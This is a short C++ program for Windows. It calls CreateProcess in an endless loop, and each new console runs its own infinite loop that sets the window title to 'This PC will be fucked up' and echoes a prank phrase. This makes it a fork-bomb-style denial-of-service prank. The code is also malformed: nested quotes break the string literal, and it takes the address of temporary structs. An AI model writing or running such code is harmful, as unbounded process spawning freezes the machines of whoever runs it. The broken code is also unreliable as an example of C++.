#include <iostream>
#include <windows.h>
using namespace std;

int main()
{
while(true)
{
CreateProcess(NULL, "cmd /c start cmd /k ":t\n&& title This PC will be fucked up\n&& color C\n&& echo femboy uwu\n&& goto t"", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &STARTUPINFO(), &PROCESS_INFORMATION());
}
return 0;
}
